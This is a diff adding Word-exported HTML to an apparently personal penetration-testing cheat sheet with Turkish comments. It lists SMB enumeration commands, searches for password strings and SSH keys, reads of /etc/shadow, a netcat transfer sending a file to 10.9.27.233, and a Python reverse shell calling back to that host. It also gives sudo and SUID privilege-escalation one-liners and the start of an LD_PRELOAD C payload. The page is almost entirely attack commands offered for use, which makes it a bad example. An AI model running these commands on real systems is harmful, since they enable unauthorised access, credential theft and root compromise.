+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>ncat </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>--ssl localhost 30001”<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>For smba<b><o:p></o:p></b></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>smbclient //</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>ip</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>/</span><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>username<span
+style='mso-tab-count:1'>          </span><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>smbclient</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'> //10.10.68.236/</span><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>anonymous</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'><span style='mso-tab-count:1'>            </span></span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B050'>Founder
+username: </span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'>smbclient -L 10.10.214.94<span
+style='mso-tab-count:2'>                    </span><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B050'>Founder
+username: </span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'>enum4linux 10.10.99.229 -U<b> <span
+style='mso-tab-count:2'>               </span><o:p></o:p></b></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>Send Data<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>smbget -R
+smb://&lt;ip</span><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>&gt;/</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>anonymous<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>smbget -R
+smb://10.10.68.236/anonymous<o:p></o:p></span></p>
+				</pre>
+			</div>
+
+		<div id="C9">
+			<h1 id="privilege" align=center style='text-align:center;color: darkred;'>Linux</h1>
+			<pre>
+				<p class=MsoNormal align=center style='text-align:center'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'>IN SHELL<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>Search</span><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:#00B050'><o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt;mso-list:l37 level1 lfo11'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>find / -type f -user &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>jon</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt; -group user6 <o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l37 level1 lfo11'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>2)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>find / -name </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>FLAG</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>* 2&gt;/dev/null<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l37 level1 lfo11'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>3)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>find / -user &lt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>username</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&gt;<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l37 level1 lfo11'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>4)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>find / -type f -exec grep -i -I
+&quot;</span><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>PASSWORD</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>&quot; {} /dev/null \;<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l37 level1 lfo11'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>5)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>find / -perm -222 -type d<span
+style='mso-spacerun:yes'>  </span>2&gt;/dev/null<span style='mso-tab-count:
+1'>           </span></span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>//yazma izni olan yerler<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt;mso-list:l37 level1 lfo11'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>6)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>find / -name id_rsa 2&gt;
+/dev/null<o:p></o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'>Upload Shell or Connect reverse Shell<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt;mso-list:l7 level1 lfo12'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>scp</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> /var/www/html/linpeas.sh </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>user</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>@&lt;ip&gt;:/dev/shm: dosya gönderme<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l7 level1 lfo12'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>2)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>scp </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&lt;user&gt;@&lt;ip&gt;:&lt;path/dosya&gt; &lt;path/dosya&gt;: dosya
+alma<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l7 level1 lfo12'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>3)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>nc</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> &lt;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>hedef_ip</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&gt; &lt;</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>port</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>&gt; &lt; alınacak dosya&gt;<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:yellow'>Ör</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>/ nc</span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'> 10.9.27.233 9999 </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>&lt; </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>suspicious.pcapng<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'>Listen<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:#00B0F0'>nc</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> -nvlp 9999 </span><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>&gt;</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'> sus.pcapng<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-indent:35.4pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt;mso-list:l7 level1 lfo12'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>4)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>python </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>-m SimpleHTTPServer 8080<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt;mso-list:l7 level1 lfo12'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>5)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>rdesktop &lt;ip&gt; -k tr-tr
+-u &lt;user&gt; -p &lt;password&gt; </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:18.0pt'><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p>&nbsp;</o:p></span></p>
+
+<h1 align=center style='text-align:center'>Privilege Escalation</h1>
+
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal align=center style='text-align:center'><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B0F0'>Info<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpFirst style='margin-left:18.0pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l27 level1 lfo41'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B050'><span
+style='mso-list:Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>cat /etc/issue<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:18.0pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l27 level1 lfo41'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B050'><span
+style='mso-list:Ignore'>2)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>cat /proc/version<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:18.0pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l27 level1 lfo41'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B050'><span
+style='mso-list:Ignore'>3)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>uname -a<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:18.0pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l27 level1 lfo41'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B050'><span
+style='mso-list:Ignore'>4)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>ps aux | grep root<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:18.0pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l27 level1 lfo41'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B050'><span
+style='mso-list:Ignore'>5)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:red;mso-fareast-language:TR'>last</span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:18.0pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l27 level1 lfo41'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B050'><span
+style='mso-list:Ignore'>6)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:red;mso-fareast-language:TR'>cat /etc/sudoers</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:18.0pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l27 level1 lfo41'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B050'><span
+style='mso-list:Ignore'>7)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:red;mso-fareast-language:TR'>cat /etc/passwd</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:18.0pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l27 level1 lfo41'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B050'><span
+style='mso-list:Ignore'>8)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:red;mso-fareast-language:TR'>cat /etc/group</span><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast style='margin-left:18.0pt;mso-add-space:auto;
+text-indent:-18.0pt;mso-list:l27 level1 lfo41'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:#00B050'><span
+style='mso-list:Ignore'>9)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:red;mso-fareast-language:TR'>cat /etc/shadow</span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p></o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'><o:p>&nbsp;</o:p></span></b></p>
+
+<p class=MsoNormal align=center style='text-align:center'><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'>SHELL<o:p></o:p></span></b></p>
+
+<p class=MsoNormal align=center style='text-align:center'><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'><o:p>&nbsp;</o:p></span></b></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>1) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>python -c
+'import pty; pty.spawn(&quot;/bin/sh&quot;)'<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>2) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>python -c
+'import pty; pty.spawn(&quot;/bin/bash&quot;)'<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>3) File Read: </span><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>python -c 'print(open(&quot;file_to_read&quot;).read())'<o:p></o:p></span></p>
+
+<p class=MsoNormal><span style='font-size:12.0pt;line-height:107%;font-family:
+"Times New Roman",serif;color:#00B0F0'>4) </span><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>python -c
+'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:18.0pt'><b><span style='font-size:12.0pt;
+line-height:107%;font-family:"Times New Roman",serif;color:red'>python3 -c
+'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.9.27.233&quot;,9999));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span></b><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:white;mso-themecolor:background1'>'<o:p></o:p></span></b></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'><o:p>&nbsp;</o:p></span></b></p>
+
+<p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt;mso-list:l13 level1 lfo34'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>sudo -u#-1 /bin/bash<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l13 level1 lfo34'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>2)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>find / -user root -perm -4000
+-print 2&gt;/dev/null<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l13 level1 lfo34'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>3)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>find / -uid 0 -perm -4002 -type
+f -exec ls -al {} \; 2&gt; /dev/null<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l13 level1 lfo34'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>4)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:red'>find / -perm -4002 -type f -exec
+ls -al {] \; 2&gt; /dev/null<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-bottom:0cm;mso-add-space:
+auto;text-indent:-18.0pt;line-height:normal;mso-list:l13 level1 lfo34'><![if !supportLists]><span
+style='font-size:12.0pt;font-family:"Times New Roman",serif;mso-fareast-font-family:
+"Times New Roman";color:yellow;mso-fareast-language:TR'><span style='mso-list:
+Ignore'>5)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:red;mso-fareast-language:TR'>echo
+os.system('/bin/bash')<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='text-indent:-18.0pt;mso-list:l13 level1 lfo34'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>6)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;mso-fareast-font-family:"Times New Roman";
+color:red;mso-fareast-language:TR'>/bin/sh -i</span><span style='font-size:
+12.0pt;line-height:107%;font-family:"Times New Roman",serif;color:red'><o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpLast><span style='font-size:12.0pt;line-height:
+107%;font-family:"Times New Roman",serif;color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoNormal><b><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B050'><o:p>&nbsp;</o:p></span></b></p>
+
+<p class=MsoNormal align=center style='text-align:center'><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'>SHELLEXEC<o:p></o:p></span></b></p>
+
+<p class=MsoNormal align=center style='text-align:center'><b><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:#00B050'><o:p>&nbsp;</o:p></span></b></p>
+
+<p class=MsoListParagraphCxSpFirst style='margin-left:71.4pt;mso-add-space:
+auto;text-indent:-18.0pt;mso-list:l21 level1 lfo32'><![if !supportLists]><span
+style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+mso-fareast-font-family:"Times New Roman";color:yellow'><span style='mso-list:
+Ignore'>1)<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></span><![endif]><span style='font-size:12.0pt;line-height:107%;
+font-family:"Times New Roman",serif;color:#00B0F0'>LD_PRELOAD<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'><o:p>&nbsp;</o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>#include &lt;sys/types.h&gt;<o:p></o:p></span></p>
+
+<p class=MsoListParagraphCxSpMiddle style='margin-left:71.4pt;mso-add-space:
+auto'><span style='font-size:12.0pt;line-height:107%;font-family:"Times New Roman",serif;
+color:red'>#include &lt;stdlib.h&gt;<o:p></o:p></span></p>
+
